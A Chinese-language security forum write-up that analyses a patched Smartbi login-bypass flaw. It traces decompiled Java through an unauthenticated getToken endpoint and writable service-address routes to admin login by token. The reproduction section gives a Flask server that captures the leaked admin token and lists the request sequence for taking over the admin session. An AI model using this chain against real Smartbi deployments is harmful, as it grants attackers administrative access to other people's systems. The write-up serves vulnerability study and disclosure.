# smartbi 登录绕过漏洞分析

> **来源**: https://forum.butian.net/share/2418  
> **文章ID**: 2418

---

smartbi 登录绕过漏洞分析
================

分析补丁
----

本次漏洞是7月底修复的漏洞

![image-20230817111122683](images/f992145c1bb89ed5bc079a0428d35abb30e32a6a7bf09.jpg)

下载`patch.patches`文件，利用解密工具逆向出补丁内容

具体修复在

![image-20230817111238203](images/f6645666817b62d02fa6d9f22aaa8b42b7a58dfe0032e.jpg)

看路由接口名像是设置某种地址，来到具体的规则实现类`RejectSmartbixSetAddress.class`

![image-20230817111917122](images/f6912113ee01e1a905a5bdbad59d0b1e7c8508dac4ef1.jpg)

可得到具体存在危险的类名和⽅法名：`smartbix.datamining.service.MonitorService::getToken()`

危险函数分析
------

在源码中找到其实现

![image-20230817144156219](images/f38969561b3c96cf19f14330d8c7378ad09351996e407.jpg)

根据注解`@FunctionPermission({"NOT_LOGIN_REQUIRED"})`，该路由接口不需要登录权限。

危险方法`getToken`中

```java
String token = this.catalogService.getToken(10800000L);
```

首先通过`this.catalogService.getToken`方法获取token的字符串，其实现如下

![image-20230817152022858](images/f87454857c29ea7f7fb0f438916501adfeb1225c2766b.jpg)

最终调用`pushLoginTokenByEngine`方法

```java
private String pushLoginTokenByEngine(Long duration) {
        IDAOModule daoModule = userManagerModule.getDaoModule();
        IStateModule stateModule = userManagerModule.getStateModule();
        if (daoModule.getFramework() != null && daoModule.getFramework().isActived()) {
            String userId = "ADMIN";
            String token = null;
            String username = null;
            User user = userManagerModule.getUserById(userId);
            if (user != null && "1".equals(user.getEnabled())) {
                username = user.getName();
                token = username + "_" + UUIDGenerator.generate();
            } else {
                ...
            }

            if (StringUtil.isNullOrEmpty(token)) {
                throw (new SmartbiException(UserManagerErrorCode.NOT_EXIST_USER)).setDetail("No admin user");
            } else {
                UserLoginToken loginToken = new UserLoginToken();
                loginToken.setToken(token);
                loginToken.setUserName(username);
                loginToken.setCreateTime(Calendar.getInstance().getTime());
                loginToken.setDuration(duration);
                LoginTokenDAO.getInstance().save(loginToken);
                return token;
            }
        } else {
           ...
        }
    }
```

根据调试会进入到if逻辑中，通过`userManagerModule.getUserById`从数据库中查询admin管理员信息构造User对象，此时token的值为

```java
token = username + "_" + UUIDGenerator.generate();
```

UUIDGenerator.generate()则是根据`UUIDGenerator`对象中IP和JVM等变量值来构造

![image-20230817151538777](images/f244521bc058c33efad202f8a7a38e0fa12cd2f8dbf65.jpg)

最后构造`UserLoginToken`对象，利用token等值对其初始化，并调用`LoginTokenDAO.getInstance().save`将信息保存到数据库中

![image-20230817151923581](images/f381705d85bd832866d8955ec6dfd5c775305878b4a46.jpg)

回到getToken方法，此时进入if-else逻辑中

```java
if (StringUtil.isNullOrEmpty(token)) {
    throw SmartbiXException.create(CommonErrorCode.NULL_POINTER_ERROR).setDetail("token is null");
} else if (!"SERVICE_NOT_STARTED".equals(token)) {
    Map<String, String> result = new HashMap();
    result.put("token", token);
    if ("experiment".equals(type)) {
        EngineApi.postJsonEngine(EngineUrl.ENGINE_TOKEN.name(), result, Map.class, new Object[0]);
    } else if ("service".equals(type)) {
        EngineApi.postJsonService(ServiceUrl.SERVICE_TOKEN.name(), result, Map.class, new Object[]{EngineApi.address("service-address")});
}

ComponentStateHolder.toSmartbiX();
ComponentStateHolder.fromSmartbiX();
}
```

会将token的值存在map类型result变量中，并根据传参type的值进入engineApi的两个不同的方法

```java

public static <T> T postJsonEngine(String type, Object data, Class<T> dataType, Object... values) throws Exception {
    String url = EngineUrl.getUrl(type, values);
    return HttpKit.postJson(url, data, dataType);
}
#EngineUrl.getUrl
public static String getUrl(String val, Object... values) {
    EngineUrl engineUrl = null;

    try {
        engineUrl = valueOf(val);
    } catch (Exception var6) {
        throw SmartbiXException.create(CommonErrorCode.ILLEGAL_PARAMETER_VALUES).setDetail(val);
    }

    if (engineUrl != null && engineUrl.url != null) {
        String url = engineUrl.url;
        url = String.format(url, values);
        if (url.contains("lang=")) {
            Locale currentLocale = LanguageHelper.getCurrentLocale();
            String language = currentLocale.toString();
            url = MessageFormat.format(url, EngineApi.address("engine-address"), language);
        } else {
            url = MessageFormat.format(url, EngineApi.address("engine-address"));
        }

        return url;
    } else {
        throw SmartbiXException.create(CommonErrorCode.NOT_FOUND_RIGHT_PATH).setDetail(val);
    }
}
```

```java
public static <T> T postJsonService(String type, Object data, Class<T> dataType, Object... values) throws Exception {
    String url = ServiceUrl.getUrl(type, values);
    return HttpsKit.postJson(url, data, dataType);
}
#ServiceUrl.getUrl
public static String getUrl(String val, Object... values) {
    ServiceUrl serviceUrl = null;

    try {
        serviceUrl = valueOf(val);
    } catch (Exception var6) {
        throw SmartbiXException.create(CommonErrorCode.ILLEGAL_PARAMETER_VALUES).setDetail(val);
    }

    if (serviceUrl != null && serviceUrl.url != null) {
        String url = serviceUrl.url;
        url = String.format(url, values);
        if (url.contains("lang=")) {
            Locale currentLocale = LanguageHelper.getCurrentLocale();
            String language = currentLocale.toString();
            url = MessageFormat.format(url, language);
        }

        return url;
    } else {
        throw SmartbiXException.create(CommonErrorCode.NOT_FOUND_RIGHT_PATH).setDetail(val);
    }
}
```

首先都是调用`getUrl()`获取url，以EngineUrl.getUrl()为例，此时传入的val="ENGINE\_TOKEN"，根据valueOf()方法构造EngineUrl对象

![image-20230817160016202](images/f527034960987cda0d49e0a48c86757cfdc834cb0f8be.jpg)

此时构造EngineUrl对象中成员变量url={0}/api/v1/configs/engine/smartbitoken

```java
if (engineUrl != null && engineUrl.url != null) {
    String url = engineUrl.url;
    url = String.format(url, values);
    if (url.contains("lang=")) {
        Locale currentLocale = LanguageHelper.getCurrentLocale();
        String language = currentLocale.toString();
        url = MessageFormat.format(url, EngineApi.address("engine-address"), language);
    } else {
        url = MessageFormat.format(url, EngineApi.address("engine-address"));
    }

    return url;
}
```

此时传入的另外一参数values为0，且url中不包括“lang=”，最终执行

```java
url = MessageFormat.format(url, EngineApi.address("engine-address"));
```

即通过EngineApi.address获取相应的地址

```java
public static String address(String type) {
    if (type.equals("engine-address")) {
        return SystemConfigService.getInstance().getValue("ENGINE_ADDRESS");
    } else if (type.equals("service-address")) {
        return SystemConfigService.getInstance().getValue("SERVICE_ADDRESS");
    } else {
        return type.equals("outside-schedule") ? SystemConfigService.getInstance().getValue("MINING_OUTSIDE_SCHEDULE") : "";
    }
}
```

`postJsonService`大同小异，只是在传入values参数时已经通过`EngineApi.address("service-address")`获取到了地址

获得请求url路径后最终都是调用`smartbix.datamining.util.https.HttpsKit::post()`方法

```java
public static <T> T post(String url, Object requestDate, ContentType contentType, JavaType responseType) throws IOException {
    RequestBuilder builder = RequestBuilder.post().setUri(url);
    if (requestDate != null) {
        contentType = contentType == null ? ContentType.APPLICATION_JSON : contentType;
        String data = requestDate instanceof String ? requestDate.toString() : CommonUtil.obj2Json(requestDate);
        builder.setEntity(new StringEntity(data, contentType));
    }

    return exe(builder.build(), responseType);
}
```

通过前面getUrl获取到的url，包含token的map对象构造http请求对象`RequestBuilder`，此时http请求的contentType为`ContentType.APPLICATION_JSON`，也就是`application/json; charset=UTF-8`

随后调用exe()方法

![image-20230817161856322](images/f2669431c6bbc9fa6dc8d1f585ae9aea570c2c2b6e510.jpg)

利用httpClient.execute()发起请求，获得response内容，此时因为type.getRawClass()为Map.class所以会进入`CommonUtil.json2Obj()`即将返回包中的body部分从json类型转化为Object类型，最后返回。

通过上述分析我们可知危险函数`getToken`主要是获取admin的token，随后将token通过`service-address`或者`engine-address`的地址通过http发送出去，并且接收其返回的json数据做转化。

那么我们是否可以修改`service-address`或者`engine-address`的地址值，让系统将生成的**Token**通过http请求发送给我们自己的服务器，这样我们就能获取到管理员的**Token**，以便我们利用其登录系统，于是我们寻找可以修改地址的接口。

### 修改address地址

根据补丁，有6个设置地址的路由

以`/setServiceAddress`为例

![image-20230817171843291](images/f5927688013769afab40c6525a5591194e7b56a28db6f.jpg)

获取post请求中body的内容，当其不为空时调用`systemConfigService.updateSystemConfig`方法来修改`SERVICE_ADDRESS`键的值为传入的serviceAddress值

修改成功后会返回"Service address updated successfully"

> 不过值得注意的使用@RequestBody，当`Content-Type: application/x-www-form-urlencoded`会对request body进行Url编码，存入的值是被编码后的，导致后续利⽤失败。
> 
> ![image-20230817173210288](images/f619231636aca541594e840489bc02b27918443d643c7.jpg)

我们获取到**Token**的值后还需要进行登录，那么我们需要找到该**Token**用于登录的接口。

### token登录

同样在`smartbix.datamining.service.MonitorService`中我们找到了**loginByToken()**这一方法，他的路由是`/smartbi/smartbix/api/monitor/login`

![image-20230817174250010](images/f8781769326f0394120671222d94ff062326f928c9de5.jpg)

主要是调用`catalogService.loginByToken`方法，跟进来到`userManagerModule.loginByToken`中

```java
public boolean loginByToken(String token) {
        if (StringUtil.isNullOrEmpty(token)) {
            return false;
        } else {
            String userName = null;
            UserLoginToken loginToken = (UserLoginToken)LoginTokenDAO.getInstance().load(token);
            if (loginToken != null) {
                if (loginToken.getCreateTime() != null && System.currentTimeMillis() - loginToken.getCreateTime().getTime() <= loginToken.getDuration()) {
                    userName = loginToken.getUserName();
                } else {
                    this.deleteLoginToken(loginToken);
                }
            }

            if (StringUtil.isNullOrEmpty(userName)) {
                return false;
            } else {
                IUser user = this.getCurrentUser();
                if (user == null || !this.isAdmin(user.getId())) {
                    if (this.stateModule.getSystemId() == null) {
                        this.stateModule.setSystemId("DEFAULT_SYS");
                    }

                    this.stateModule.setCurrentUser(this.getUserById("SERVICE"));
                }

                if (loginToken != null && this.stateModule.getSession() != null) {
                    String ext = loginToken.getExtended();
                    JSONObject extended = StringUtil.isNullOrEmpty(ext) ? new JSONObject() : JSONObject.fromString(ext);
                    extended.put("sessionId", this.stateModule.getSession().getId());
                    loginToken.setExtended(extended.toString());
                    LoginTokenDAO.getInstance().update(loginToken);
                }

                return this.switchUser(userName);
            }
        }
    }
```

这里利用传入的token值，通过`LoginTokenDAO::load`获取数据，初始化UserLoginToken对象，当其不为null，并且在有效期内时当前用户转化为此用户

### 复现

首先编写fake server，用来处理getToken过程：

```python
from flask import *

app = Flask(__name__)

@app.route('/api/v1/configs/engine/smartbitoken', methods=["POST"])
def getToken():  # put application's code here
    print(request.data)
    return {}, 200, {"Content-Type": "application/json"}

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8000)
```

请求`setServiceAddress`接口，设置服务器地址：

![image-20230818104946491](images/f162649867070e4d23051355c795709b209a08969e936.jpg)

请求`token`接口，获取token的值

![image-20230818105031028](images/f7574133b71084b9c44d4bace4e5bc16e73597fcf48df.jpg)

![image-20230818105147052](images/f741490807989ce6c6ca4fd4e766bc81e9a0967845d9e.jpg)

最后请求`login`接口获取admin用户的SESSION，成功登录：

![image-20230818105414802](images/f151272da1ad17d530e90b2b588e699187abeb2e7c373.jpg)

> **注意**：有可能此时返回的值是 false ，这是由于在调⽤ getToken ⽅法时，使⽤了nc监听或者返回的值不是 json格式，导致报错，那么你的token就没被存⼊对应的变量中，这时候你就需要编写⼀个 fake server ，返回任意的json格式即可。
